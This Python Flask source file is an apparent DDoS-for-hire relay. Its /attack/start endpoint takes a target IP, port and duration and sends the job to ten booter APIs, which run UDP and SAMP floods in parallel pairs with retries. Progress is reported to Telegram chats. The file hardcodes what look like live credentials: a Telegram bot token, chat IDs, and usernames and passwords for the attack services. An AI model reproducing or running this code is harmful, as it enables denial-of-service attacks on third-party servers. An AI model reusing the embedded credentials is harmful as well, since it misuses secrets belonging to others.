# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
import requests
import logging
import time
import threading

app = Flask(__name__)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Telegram Configuration
BOT_TOKEN = "6982857776:AAFDG6KtTz4T6jYjeZiwFdqZgTpqSW8Mj3Y"
CHAT_IDS = ["8523310365", "7646520243"]
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

def send_telegram_message(message):
    for chat_id in CHAT_IDS:
        if chat_id:
            try:
                requests.post(TELEGRAM_API_URL, data={'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}, timeout=5)
            except:
                pass

# ==================== TARGET APIS ====================
TARGET_APIS = [
    {"id": 1, "name": "OLD_API_1", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    {"id": 2, "name": "OLD_API_2", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    {"id": 3, "name": "OLD_API_3", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    {"id": 4, "name": "OLD_API_4", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    {"id": 5, "name": "OLD_API_5", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    
    {"id": 6,  "name": "NEW_API_1", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "busy_until": 0},
    {"id": 7,  "name": "NEW_API_2", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "busy_until": 0},
    {"id": 8,  "name": "NEW_API_3", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "busy_until": 0},
    {"id": 9,  "name": "NEW_API_4", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "busy_until": 0},
    {"id": 10, "name": "NEW_API_5", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "busy_until": 0},
]

def is_api_available(api):
    if api['busy'] and time.time() < api.get('busy_until', 0):
        return False
    return True

def mark_busy(api, duration):
    api['busy'] = True
    api['busy_until'] = time.time() + duration + 10  # Extra buffer

def mark_free(api):
    api['busy'] = False
    api['busy_until'] = 0

def get_response_summary(response, response_time):
    summary = f"Status: {response.status_code} | Time: {response_time}ms\n"
    try:
        json_data = response.json()
        summary += f"JSON: {json_data}"
    except:
        text = response.text.strip()
        if len(text) > 700:
            text = text[:700] + "... [truncated]"
        summary += f"Response: {text}"
    return summary

def is_attack_successful(response):
    if not response:
        return False
    try:
        data = response.json()
        error = data.get('error')
        message = str(data.get('message', '')).lower()
        if error is False or any(word in message for word in ['launched', 'success', 'started', 'sent', 'attack']):
            return True
        if error is True or any(word in message for word in ['slots full', 'busy', 'full', 'wait', 'limit', 'cooldown', 'fail']):
            return False
    except:
        pass
    return response.status_code == 200

def send_attack_to_api(api, ip, port, duration, packet_len=512):
    method = "samp" if api["type"] == "old" else "udp"
    max_retries = 8
    retry_count = 0

    while retry_count < max_retries:
        attempt = retry_count + 1
        start_time = time.time()
        
        try:
            if api["type"] == "old":
                target_url = api['url'].format(method=method, ip=ip, port=port, time=duration)
            else:
                target_url = api['url'].format(method=method, ip=ip, port=port, time=duration, len=packet_len)

            response = requests.get(target_url, timeout=25)
            response_time = int((time.time() - start_time) * 1000)
            
            send_telegram_message(f"""
🔵 <b>ATTEMPT #{attempt}/{max_retries}</b> | {api['name']}
├ Method: {method.upper()}
├ Target: {ip}:{port}
├ Duration: {duration}s
├ Status: {response.status_code}
└ Response:
{get_response_summary(response, response_time)}
""")

            if is_attack_successful(response):
                send_telegram_message(f"""
✅ <b>ATTACK STARTED SUCCESSFULLY</b> | {api['name']}
├ Method: {method.upper()} | {ip}:{port} | {duration}s
""")
                return True

            retry_count += 1
            if retry_count < max_retries:
                time.sleep(2)

        except Exception as e:
            retry_count += 1
            send_telegram_message(f"⚠️ Error on {api['name']} (Attempt {attempt}): {str(e)[:150]}")
            if retry_count < max_retries:
                time.sleep(min(2 ** retry_count, 10))

    send_telegram_message(f"💀 All retries failed on {api['name']}")
    return False

def execute_attack(old_api, new_api, ip, port, total_time, packet_len=512):
    selected = [old_api, new_api]
    
    # Mark both busy immediately
    for api in selected:
        mark_busy(api, total_time)
        send_telegram_message(f"🚀 LAUNCHING → {api['name']} | {ip}:{port} ({total_time}s)")

    # Start both attacks in parallel
    threads = []
    for api in selected:
        t = threading.Thread(target=send_attack_to_api, 
                           args=(api, ip, port, total_time, packet_len), 
                           daemon=True)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    # Wait full duration even if one failed
    send_telegram_message(f"⏳ Waiting full duration ({total_time}s) before releasing both APIs...")
    time.sleep(total_time)

    # Free both APIs
    for api in selected:
        mark_free(api)
        send_telegram_message(f"✅ SLOT RELEASED → {api['name']} is now available")

    send_telegram_message(f"✅ Pair Attack Completed → {ip}:{port} ({total_time}s)")

@app.route('/attack/start', methods=['GET'])
def start_attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_param = request.args.get('time')
    packet_len = request.args.get('len', 512)

    if not all([ip, port, time_param]):
        return jsonify({'error': 'Missing ip, port or time'}), 400

    try:
        port = int(port)
        total_time = int(time_param)
        packet_len = int(packet_len)
        if total_time <= 0 or total_time > 3600:
            raise ValueError
    except:
        return jsonify({'error': 'Invalid parameters'}), 400

    # Find first available paired APIs
    for i in range(5):
        old_api = TARGET_APIS[i]
        new_api = TARGET_APIS[i + 5]
        
        if is_api_available(old_api) and is_api_available(new_api):
            threading.Thread(
                target=execute_attack,
                args=(old_api, new_api, ip, port, total_time, packet_len),
                daemon=True
            ).start()
            
            return jsonify({
                'success': True,
                'pair': f"{old_api['name']} + {new_api['name']}",
                'target': f'{ip}:{port}',
                'time': total_time,
                'status': 'Both APIs running in parallel'
            })

    return jsonify({'error': 'All API pairs are currently busy'}), 503

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        'free_pairs': [f"Pair {i+1}" for i in range(5) 
                      if is_api_available(TARGET_APIS[i]) and is_api_available(TARGET_APIS[i+5])],
        'busy_apis': [api['name'] for api in TARGET_APIS if api['busy']]
    })

if __name__ == '__main__':
    print("="*100)
    print("🚀 PAIRED API SYSTEM ACTIVE")
    print("Pairing: 1-6, 2-7, 3-8, 4-9, 5-10")
    print("→ If one API fails, the other still runs full time")
    print("→ Both slots released only after full duration")
    print("Usage: /attack/start?ip=1.2.3.4&port=80&time=300&len=1024")
    print("="*100)
    app.run(host='0.0.0.0', port=8080, threaded=True)
